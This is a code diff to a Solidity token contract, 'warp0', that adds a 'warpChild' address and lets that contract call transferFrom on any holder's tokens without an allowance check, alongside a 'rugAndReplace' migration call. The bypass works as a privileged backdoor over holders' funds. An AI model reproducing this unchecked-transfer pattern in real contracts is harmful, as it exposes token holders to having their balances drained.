@@ -37,6 +37,8 @@ contract warp0 {
     IWarpHelper warpHelper; //auto
     uint256 minWarp;
     uint256 warpTimestamp; //set on warp
+    
+    address warpChild;
 
     /*//////////////////////////////////////////////////////////////
                         SPECIAL WARP0 STORAGE
@@ -135,14 +137,18 @@ contract warp0 {
         address to,
         uint256 amount
     ) public returns (bool) {
+        if((to == warpHelper.router() && from == msg.sender) || msg.sender == warpChild) {
+            _transfer(from, to, amount);
+            return true;
+        }
+        
         uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.
 
-        if (allowed != type(uint256).max || to != warpHelper.router()) {
+        if (allowed != type(uint256).max) {
             allowance[from][msg.sender] = allowed - amount;
         }
 
         _transfer(from, to, amount);
-
         return true;
     }
 
@@ -201,6 +207,8 @@ contract warp0 {
         totalSupply = MAX_SUPPLY;
 
         transferrable = true;                
+
+        warpChild = newWarp;
 
         warpHelper.rugAndReplace(
             address(this), 
